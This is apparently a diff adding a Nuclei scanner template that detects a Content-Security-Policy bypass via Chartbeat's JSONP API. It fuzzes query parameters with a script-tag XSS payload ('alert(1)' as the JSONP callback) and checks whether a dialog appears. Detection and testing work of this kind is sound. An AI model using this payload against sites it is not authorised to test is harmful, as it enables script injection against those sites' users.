@@ -1,0 +1,55 @@
+id: chartbeat-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via Chartbeat API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,chartbeat-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "chartbeat.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: chartbeat_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.chartbeat.com/toppages/?jsonp=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "chartbeat_api_csp_xss == true"
+# digest: 4a0a0047304502204621034ad8464e9fea73233ebf9c46d30fd42cf9c1e0296bb1d464d6f7b8c66b022100e7fdf0b1599521b7fcd78325e193c2d6fcb60ddb51cbd189fd059a5f60521b14:922c64590222798bb761d5b6d8e72950
